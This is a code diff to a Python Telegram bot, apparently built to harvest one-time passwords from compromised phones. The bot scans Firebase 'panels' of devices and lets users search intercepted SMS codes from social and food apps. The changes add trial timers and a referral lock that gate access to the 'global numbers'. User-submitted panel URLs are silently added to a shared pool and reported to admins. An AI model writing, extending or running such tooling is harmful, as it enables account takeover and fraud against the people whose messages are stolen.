@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 """
 ══════════════════════════════════════════════════════
-  OTP PANEL BOT — HACKER & ANTI-CRASH EDITION         
+  OTP PANEL BOT — 3-STAGE VIP LOCK & ANTI-CRASH       
   ULTRA-SPEED PROGRESSIVE SCANNER & APP-SPECIFIC SEARCH
-  (1-HOUR FREE TRIAL + REFERRAL LOCK + PRIVACY)
+  (30M GLOBAL -> 1H PERSONAL -> 10 REF LOCK)
 ══════════════════════════════════════════════════════
 """
 
@@ -216,7 +216,7 @@ def load_data():
             all_users[adm]["global_spam"] = False 
             save_user(adm)
         if adm not in all_users:
-            all_users[adm] = {"name": "Supreme Owner", "username": "", "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"), "verified": True, "referrals": 0, "access_until": 2e10, "has_global_access": True, "otp_count": 0, "global_spam": False, "custom_dbs": [], "selected_panel": "ALL"}
+            all_users[adm] = {"name": "Supreme Owner", "username": "", "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"), "verified": True, "referrals": 0, "access_until": 2e10, "global_trial_end": 2e10, "personal_trial_end": 2e10, "has_global_access": True, "otp_count": 0, "global_spam": False, "custom_dbs": [], "selected_panel": "ALL"}
             save_user(adm)
 
 def save_user(uid: int):
@@ -438,6 +438,38 @@ def sms_date(sms: dict) -> str:
 def seen_key(device_id: str, k: str) -> str: return f"{device_id}/{k}"
 def device_label(d: 'Device') -> str: return " & ".join(d.numbers) if d.numbers else f"{d.name} ({d.id[:8]})"
 
+# 🔥 NEW: STRICT ACCESS ENFORCER FUNCTION 🔥
+async def enforce_access(ctx: ContextTypes.DEFAULT_TYPE, chat_id: int, reply_func) -> bool:
+    u = all_users.get(chat_id, {})
+    is_admin = chat_id in ADMIN_IDS or u.get("has_global_access", False)
+    if is_admin: return True
+    
+    now = time.time()
+    is_vip = now < u.get("access_until", 0)
+    is_global_trial = now < u.get("global_trial_end", 0)
+    is_personal_trial = now < u.get("personal_trial_end", 0)
+    
+    if is_vip or is_global_trial or is_personal_trial:
+        return True
+        
+    refs = u.get("referrals", 0)
+    if refs >= 10:
+        all_users[chat_id]["referrals"] -= 10
+        all_users[chat_id]["access_until"] = now + 86400
+        save_user(chat_id)
+        await reply_func("✅ <b>10 Referrals Redeemed!</b>\nAapka 24 Hours VIP Access (Global + Personal) unlock ho gaya hai.", parse_mode="HTML")
+        return True
+        
+    ref_link = f"https://t.me/{ctx.bot.username}?start={chat_id}"
+    
+    if u.get("personal_trial_end", 0) == 0:
+        msg = f"🛑 <b>GLOBAL TRIAL EXPIRED</b> 🛑\n\nAapka 30-min ka free Global Trial khatam ho gaya hai. Global numbers hide ho gaye hain.\n\n✅ <b>Free 1 Hour Personal Trial lene ke liye:</b>\nMenu se <b>'Add Panel'</b> dabayein aur apna khud ka Firebase URL add karein!\n\nYA 10 referrals karein 24h VIP (Global) ke liye.\n📉 Your Referrals: {refs}/10\n🔗 Your Link:\n<code>{ref_link}</code>"
+    else:
+        msg = f"🛑 <b>ALL TRIALS EXPIRED</b> 🛑\n\nAapke sabhi 30-min Global aur 1-hour Personal free trials khatam ho gaye hain.\nAb premium panels use karne ke liye <b>10 referrals</b> chahiye (24 hrs VIP access).\n\n📉 Your Referrals: {refs}/10\n🔗 Your Link:\n<code>{ref_link}</code>\n\nShare this link to get access!"
+        
+    await reply_func(msg, parse_mode="HTML")
+    return False
+
 async def fetch_db_data(tag: str, url: str) -> list[Device]:
     async with WORKER_SEMAPHORE:
         devices_list = []
@@ -478,28 +510,38 @@ async def fetch_db_data(tag: str, url: str) -> list[Device]:
         except Exception: pass
         return devices_list
 
+# 🔥 NEW: HIDING GLOBAL PANELS IF GLOBAL TRIAL EXPIRES 🔥
 async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = None) -> list[Device]:
     if users_db is None: users_db = {}
-    is_global = chat_id in ADMIN_IDS or users_db.get(chat_id, {}).get("has_global_access", False)
+    u_data = users_db.get(chat_id, {})
     
-    if is_global and "ALL" in GLOBAL_DEVICE_CACHE and len(GLOBAL_DEVICE_CACHE["ALL"]) > 0:
+    is_admin = chat_id in ADMIN_IDS or u_data.get("has_global_access", False)
+    is_vip = time.time() < u_data.get("access_until", 0)
+    is_global_trial = time.time() < u_data.get("global_trial_end", 0)
+    
+    is_global_view = is_admin or is_vip or is_global_trial
+    
+    if is_global_view and "ALL" in GLOBAL_DEVICE_CACHE and len(GLOBAL_DEVICE_CACHE["ALL"]) > 0:
         return GLOBAL_DEVICE_CACHE["ALL"]
 
+    # ONLY LOAD PERSONAL DBS IF GLOBAL TRIAL IS OVER
     dbs_to_check = []
     if chat_id in users_db:
-        for i, _ in enumerate(get_user_dbs(users_db[chat_id])): dbs_to_check.append(f"U_{chat_id}_{i}")
+        for i, _ in enumerate(get_user_dbs(u_data)): 
+            dbs_to_check.append(f"U_{chat_id}_{i}")
 
     all_gathered = []
-    for tag in dbs_to_check: all_gathered.extend(GLOBAL_DEVICE_CACHE.get(tag, []))
+    for tag in dbs_to_check: 
+        all_gathered.extend(GLOBAL_DEVICE_CACHE.get(tag, []))
 
     number_map = {}
     for d in all_gathered:
         if d.numbers:
             main_num = d.numbers[0]
-            if main_num not in number_map: number_map[main_num] = d
-            else:
-                if d.timestamp > number_map[main_num].timestamp: number_map[main_num] = d
-        else: number_map[d.id] = d 
+            if main_num not in number_map or d.timestamp > number_map[main_num].timestamp: 
+                number_map[main_num] = d
+        else: 
+            number_map[d.id] = d 
 
     unique_devices = list(number_map.values())
     unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, d.numbers[0] if d.numbers else d.id))
@@ -743,8 +785,19 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     bot_token = ctx.bot.token
     
     if chat_id not in all_users:
-        # 🔥 NEW: 1 Hour VIP Access (3600 seconds) for new users
-        all_users[chat_id] = {"name": update.effective_user.first_name, "username": update.effective_user.username, "joined_at": datetime.now().strftime("%d %b %Y"), "referrals": 0, "access_until": time.time() + 3600, "has_global_access": False, "otp_count": 0, "custom_dbs": [], "selected_panel": "ALL"}
+        all_users[chat_id] = {
+            "name": update.effective_user.first_name, 
+            "username": update.effective_user.username, 
+            "joined_at": datetime.now().strftime("%d %b %Y"), 
+            "referrals": 0, 
+            "access_until": 0, 
+            "global_trial_end": time.time() + 1800, # 30 Mins Global Trial
+            "personal_trial_end": 0, 
+            "has_global_access": False, 
+            "otp_count": 0, 
+            "custom_dbs": [], 
+            "selected_panel": "ALL"
+        }
         text = update.message.text.split()
         if len(text) > 1 and text[1].isdigit():
             ref_id = int(text[1])
@@ -754,8 +807,10 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 try: await ctx.bot.send_message(ref_id, f"🎉 New user joined via your link! Total Referrals: {all_users[ref_id]['referrals']}/10")
                 except: pass
         save_user(chat_id)
+        
         try:
-            await ctx.bot.send_message(chat_id, "🎉 <b>WELCOME BONUS!</b>\nAapko 1 Ghante ka FREE VIP Access mila hai!\n\n<i>1 ghante baad premium panels continue rakhne ke liye aapko 10 referrals karne honge ya apna khud ka Firebase add karna hoga.</i>", parse_mode="HTML")
+            msg = "🎉 <b>WELCOME BONUS!</b>\nAapko <b>30-Mins ka FREE Global VIP Access</b> mila hai! Aap sabhi admin panels aur numbers dekh sakte hain.\n\n<i>30 minute baad global numbers hide ho jayenge, uske baad 'Add Panel' karke apna Firebase daalne par aapko 1 Hour ka extra Personal Trial milega!</i>"
+            await ctx.bot.send_message(chat_id, msg, parse_mode="HTML")
         except: pass
 
     if update.effective_chat.type == "private" and not await check_force_sub(ctx.bot, chat_id):
@@ -797,6 +852,14 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             try: await query.message.delete()
             except: pass
             return
+            
+        # 🔥 PROTECTING CALLBACK ACTIONS WITH ENFORCE ACCESS 🔥
+        protected_callbacks = ["open_app_search", "home", "online", "open_checker_menu", "open_auto_checker_menu"]
+        if data in protected_callbacks or data.startswith(("app_search:", "auto_fb:", "f30:", "chk_srv:", "pg:", "sel:", "msgs:", "info:")):
+            async def edit_reply(txt, parse_mode="HTML"):
+                await safe_edit(query, txt, parse_mode=parse_mode)
+            if not await enforce_access(ctx, chat_id, edit_reply):
+                return
             
         if data == "open_app_search":
             await safe_edit(query, "🍔 <b>SOCIAL & FOOD OTPs (Last 24h)</b>\n━━━━━━━━━━━━━━━━━━\nSelect an app below to deeply scan all devices for its OTPs:", reply_markup=get_app_search_menu(), parse_mode="HTML")
@@ -1148,23 +1211,11 @@ async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
 
     if not text: return
 
-    # 🔥 STRICT REFERRAL LOCK & 1 HOUR FREE TRIAL CHECK
+    # 🔥 PROTECTING TEXT COMMANDS WITH ENFORCE ACCESS 🔥
     protected_commands = ["Devices List", "Manual Checker", "Auto-Check Panels", "Scan Hidden Devices", "🔥 30-Min Fresh Devices", "🍔 App OTPs (24h)"]
     if text in protected_commands:
-        is_global = chat_id in ADMIN_IDS or all_users.get(chat_id, {}).get("has_global_access", False)
-        if not is_global:
-            access_end = all_users.get(chat_id, {}).get("access_until", 0)
-            if time.time() > access_end:
-                refs = all_users.get(chat_id, {}).get("referrals", 0)
-                if refs >= 10:
-                    all_users[chat_id]["referrals"] -= 10
-                    all_users[chat_id]["access_until"] = time.time() + 86400
-                    save_user(chat_id)
-                    await update.message.reply_text("✅ <b>10 Referrals Redeemed!</b>\nYou now have 24 hours of full access to your panels.", parse_mode="HTML")
-                else:
-                    ref_link = f"https://t.me/{ctx.bot.username}?start={chat_id}"
-                    await update.message.reply_text(f"🛑 <b>VIP TRIAL EXPIRED</b> 🛑\n\nAapka 1 ghante ka free trial khatam ho gaya hai.\nAb premium panels dekhne ke liye <b>10 referrals</b> chahiye (24 hrs access) YA 'Add Panel' pe click karke apna Firebase add karein.\n\n📉 Your Referrals: {refs}/10\n🔗 Your Link:\n<code>{ref_link}</code>\n\nShare this link to get access!", parse_mode="HTML")
-                    return
+        if not await enforce_access(ctx, chat_id, update.message.reply_text):
+            return
 
     if text == "Search Number (God)":
         user_focus.setdefault(bot_token, {}).pop(chat_id, None)
@@ -1407,6 +1458,12 @@ async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 SETTINGS.setdefault("global_panels", []).append(custom_url)
                 new_global_added += 1
                 
+        # 🔥 START PERSONAL TRIAL 1-HOUR 🔥
+        trial_msg = ""
+        if users_db[chat_id].get("personal_trial_end", 0) == 0:
+            users_db[chat_id]["personal_trial_end"] = time.time() + 3600
+            trial_msg = "\n\n🎁 <b>BONUS:</b> Aapka 1 Ghante ka FREE Personal Trial shuru ho gaya hai! Ab aap apne panels bina kisi limit ke 1 hour tak access kar sakte hain."
+        
         save_settings()
         save_user(chat_id)
         
@@ -1415,7 +1472,7 @@ async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             for adm in ADMIN_IDS: await ctx.bot.send_message(adm, alert)
         except: pass
         
-        await update.message.reply_text(f"✅ {len(urls)} Personal Firebase URLs added successfully!\nThese are safely stored.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Home", callback_data="home")]]))
+        await update.message.reply_text(f"✅ {len(urls)} Personal Firebase URLs added successfully!{trial_msg}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Home", callback_data="home")]]), parse_mode="HTML")
         return
 
 # ═══════════════════════════════════════════════════════
